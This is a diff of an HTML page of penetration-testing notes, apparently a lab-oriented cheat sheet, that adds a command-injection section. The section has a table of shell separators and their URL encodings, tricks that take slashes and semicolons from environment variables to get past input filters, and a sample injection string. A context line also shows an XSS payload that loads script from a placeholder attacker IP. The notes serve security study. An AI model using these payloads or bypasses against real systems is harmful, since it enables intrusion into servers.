@@ -291,10 +291,120 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
                         </ul>
                         <h2 id="Command Injection">Command Injection</h2>
                         <ul>
-                            <h3>Situations</h3>
-                            <p>In case you are trying to inject code and you know that in the background there is a bash file which will reciep your command you can try to use</p>
-                            <p><b>;</b> to stop the current command and execute the following and <b>#</b> to comment the rest</p>
-                            <pre><code class="language-bash">/etc/passwd; whoami #</code></pre>
+                            <p>Examples of command injection</p>
+                            <table border="1" cellpadding="8" cellspacing="0">
+                <tr>
+                    <thead>
+                        <th >Injection char </th>
+                        <th >URL-Encoded Character</th>
+                        <th >Description</th>
+                    </thead>
+                </tr>
+                <tbody>
+                <tr>    
+                    <td>;</th>
+                    <td>%3b</th>
+                    <td>Executes commands in order (ls ; mkdir)</th>
+                </tr>
+                <tr>
+                    <td>
+ 
+                    </th>
+                    <td>%0a</th>
+                    <td><b>(Just press enter don't complicate your life typing \n)</b></th>
+                </tr>
+                <tr>
+                    <td>TAB</th>
+                    <td>%0a%09</th>
+                    <td><b>(Just press tab don't complicate your life typing TAB)</b></th>
+                </tr>
+                <tr>
+                    <td>&</th>
+                    <td>%26</th>
+                    <td>Executes the command at the background (mkdir file &)</th>
+                </tr>
+                <tr>
+                    <td>|</th>
+                    <td>%7c</th>
+                    <td>Uses the output of the first one for the second command</th>
+                </tr>
+                <tr>
+                    <td>&&</th>
+                    <td>%26%26</th>
+                    <td><b>Only executes the second command if the first command sucess (AND)</b> </th>    
+                </tr>
+                <tr>
+                    <td>||</th>
+                    <td>%7c%7c</th>
+                    <td><b>Only executes the second command if the first command fails (OR)</b> (ip a || ls) if ip a fails it will execute ls</th>
+                </tr>
+                <tr>
+                    <td>{ls,-la}</th>
+                    <td>%7Bls%2C-la%7D</th>
+                    <td>The Bash Brace Expansion feature, which automatically adds spaces between arguments wrapped between braces</th>
+                </tr>
+                <tr>
+                    <td>%0a${IFS}</th>
+                    <td>%0a${IFS}</th>
+                    <td>It is Linux environment variable tha may also work since its default value it is space and tab. In this case it works because the tested app could be bypassed with %0a$</th>
+                </tr>
+                <tr>
+                    <td>``</th>
+                    <td>%60%60</th>
+                    <td>Executes the command in and substitute with the result. <b>echo `whoami` will result in echo carlos</b> only if the username is carlos of course </th>
+                </tr>
+                <tr>
+                    <td>$()</th>
+                    <td>%24%28%29</th>
+                    <td>Same as the previous but in case of error it will not replace the result with the error <b>echo $(ls non_existent_file)</b> </th>
+                </tr>
+                </tbody>
+                </table>
+
+                <h3>Advanced bypassing</h3>
+                <h4>Linux</h4>
+                <ul>
+                <p>With the use of env variables we are able to extract chars from there for example. In case we print the PATH in a Linux box</p>
+                <pre><code class="language-bash">echo ${PATH}
+/usr/local/bin:/usr/bin:/bin:/usr/games</code></pre>
+                <p>Now we can extract any of the slashes (/) from that string. The following command starts at first char (0) and get a string with length of (1)</p>
+                <pre><code class="language-bash">echo ${PATH:0:1}</code></pre>
+                <p>Resulting in a simple slash that can be used in command injection instead of typing the slash itself. Same process can be performed with another env variables</p>
+                <p>Here is another example but with <b>;</b></p>
+                <pre><code class="language-bash">${LS_COLORS:10:1}</code></pre>    
+                
+                </ul>
+                
+                <h4>Windows</h4>
+                <ul>
+                <h5>CMD</h5>
+                <ul>    
+                <p>Same process can be achieved with Windows operating systems.</p>
+                <p>Based on the following result which allow us to check the current path</p>
+                <pre><code class="language-bash">echo %HOMEPATH%
+\Users\htb-student</code></pre>
+                <p>We can extract an slash "/" by doing. Which internally is selecting the 6th char and then substracting the last 11 chars</p>
+                <pre><code class="language-bash">echo %HOMEPATH:~6,-11%</code></pre>    
+                </ul>
+
+                <h5>Powershell</h5>
+                <ul>
+                    <p>An easy process can be performed in Windows powershell. You can list the current path by doing</p>
+                    <ul>
+                        <pre><code class="language-bash">$env:HOMEPATH</code></pre>
+                        <p>Since in powershell all strings are trated as arrays we can just print a cell of the array by doing the following that will print an slash</p>
+                        <pre><code class="language-bash">$env:HOMEPATH[0]</code></pre>
+                    </ul>
+                </ul>
+            </ul>
+
+                <h3>Situations</h3>
+                <ul>
+                    <p>In case you are trying to inject code and you know that in the background there is a bash file which will reciep your command you can try to use</p>
+                    <p><b>;</b> to stop the current command and execute the following and <b>#</b> to comment the rest</p>
+                    <pre><code class="language-bash">/etc/passwd; whoami #</code></pre>
+                </ul>
+
                         </ul>
                         <h2 id = "SSTI: Server Side Template Injection" >SSTI: Server Side Template Injection</h2>
                         <ul>
